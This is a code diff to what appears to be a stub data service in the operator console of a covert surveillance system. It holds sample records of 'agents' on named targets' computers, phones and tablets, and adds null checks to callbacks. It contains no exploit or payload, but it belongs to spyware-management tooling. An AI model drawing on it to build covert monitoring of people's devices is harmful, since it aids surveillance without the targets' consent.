@@ -22,8 +22,7 @@ package it.ht.rcs.console.agent.rest
         new Agent({ _id:"4e26a843963d350f4e000004",  _kind:"agent",  desc:"Joey's Mac",                   name: "Joey mac (1)",      version: 10,  ident:"RCS_0000000004",  counter: 1,  path :["4df7246d963d350964000001", "4e268719963d350658000003"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a884963d350f4e00000b", last_sync: 1308514166, evidence: {}, grid_size: 0, size: 0 }) }),
         new Agent({ _id:"4e26a84a963d350f4e000005",  _kind:"agent",  desc:"Joey's PC",                    name: "Joey pc (1)",       version: 10,  ident:"RCS_0000000004",  counter: 2,  path :["4df7246d963d350964000001", "4e268719963d350658000003"],  status: "closed",  upgradable: false,  stat: new Stat({ _id:"4e26a889963d350f4e00000c", last_sync: 1307512166, evidence: {}, grid_size: 0, size: 0 }) }),
         new Agent({ _id:"4e26a850963d350f4e000006",  _kind:"agent",  desc:"Joey's Mobile",                name: "Joey mob (1)",      version: 10,  ident:"RCS_0000000005",  counter: 3,  path :["4df7246d963d350964000001", "4e268719963d350658000003"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a890963d350f4e00000d", last_sync: 1307514166, evidence: {}, grid_size: 0, size: 0,
-                                                                                                                                                                                                                                                                                                                                                  source: "1.2.3.4", user: "Joey", device: "スパイ" }) }),
-        
+                                                                                                                                                                                                                                                                                                                                                  source: "1.2.3.4",     user: "Joey", device: "スパイ" }) }),
         // Guido (BlackJack)
         new Agent({ _id:"4e26a857963d350f4e000007",  _kind:"agent",  desc:"Guido's PC",                   name: "Guido pc (1)",      version: 10,  ident:"RCS_0000000006",  counter: 1,  path :["4e259fe5963d35425c000001", "4e268724963d350658000004"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a895963d350f4e00000e", last_sync: 1305514166, evidence: {}, grid_size: 0, size: 0 }) }),
         new Agent({ _id:"4e26a85d963d350f4e000008",  _kind:"agent",  desc:"Guido's iPad",                 name: "Guido ipad (1)",    version: 10,  ident:"RCS_0000000007",  counter: 1,  path :["4e259fe5963d35425c000001", "4e268724963d350658000004"],  status: "open",    upgradable: false,  stat: new Stat({ _id:"4e26a89a963d350f4e00000f", last_sync: 1308514166, evidence: {}, grid_size: 0, size: 0 }) }),
@@ -40,9 +39,8 @@ package it.ht.rcs.console.agent.rest
     
     public function all(onResult:Function=null, onFault:Function=null):void
     {
-      var event:ResultEvent = new ResultEvent('agent.all', false, true, agents);
       if (onResult != null)
-        onResult(event);
+        onResult(new ResultEvent('agent.all', false, true, agents));
     }
     
     public function show(id:String, onResult:Function=null, onFault:Function=null):void
@@ -57,8 +55,8 @@ package it.ht.rcs.console.agent.rest
       agent.path = [operation._id, target._id];
       agents.addItem(agent);
       
-      var event:ResultEvent = new ResultEvent('agent.create', false, true, agent);
-      onResult(event);
+      if (onResult != null)
+        onResult(new ResultEvent('agent.create', false, true, agent));
     }
     
     public function update(agent:Agent, property:Object, onResult:Function=null, onFault:Function=null):void
@@ -67,6 +65,10 @@ package it.ht.rcs.console.agent.rest
     
     public function destroy(id:String, onResult:Function=null, onFault:Function=null):void
     {
+      if (onResult != null)
+        onResult(new ResultEvent('agent.destroy'));
     }
+    
   }
+  
 }
